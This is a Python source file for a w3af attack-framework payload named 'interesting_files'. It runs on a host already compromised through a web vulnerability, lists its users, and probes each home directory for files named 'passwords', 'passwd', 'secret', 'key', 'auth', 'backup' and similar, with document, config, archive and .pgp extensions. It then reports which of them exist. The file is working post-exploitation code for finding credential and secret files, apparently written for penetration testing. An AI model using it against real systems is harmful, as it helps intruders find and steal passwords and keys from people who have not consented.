from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class interesting_files(Payload):
    """
    Search for interesting files in all known directories.
    """
    KNOWN_FALSE_POSITIVES = set(['/bin/pwd', ])

    def _file_path_generator(self):
        interesting_extensions = []
        interesting_extensions.append('')   # no extension
        interesting_extensions.append('.txt')
        interesting_extensions.append('.doc')
        interesting_extensions.append('.readme')
        interesting_extensions.append('.xls')
        interesting_extensions.append('.xlsx')
        interesting_extensions.append('.docx')
        interesting_extensions.append('.pptx')
        interesting_extensions.append('.odt')
        interesting_extensions.append('.wri')
        interesting_extensions.append('.config')
        interesting_extensions.append('.nfo')
        interesting_extensions.append('.info')
        interesting_extensions.append('.properties')
        interesting_extensions.append('.tar')
        interesting_extensions.append('.tar.gz')
        interesting_extensions.append('.pgp')

        file_list = []
        file_list.append('backup')
        file_list.append('passwords')
        file_list.append('passwd')
        file_list.append('pwd')
        file_list.append('password')
        file_list.append('access')
        file_list.append('auth')
        file_list.append('authentication')
        file_list.append('authenticate')
        file_list.append('secret')
        file_list.append('key')
        file_list.append('keys')
        file_list.append('permissions')
        file_list.append('perm')

        users_result = self.exec_payload('users')

        #
        #    Create the list of files
        #
        for user in users_result:
            home = users_result[user]['home']

            for interesting_file in file_list:
                for extension in interesting_extensions:
                    file_fp = home + interesting_file + extension
                    yield file_fp

    def api_read(self):
        result = {}

        file_path_iter = self._file_path_generator()

        for file_fp, content in self.read_multi(file_path_iter):
            if content and file_fp not in self.KNOWN_FALSE_POSITIVES:
                result[file_fp] = None

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No interesting files found.'
        else:
            rows = []
            rows.append(['Interesting files', ])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
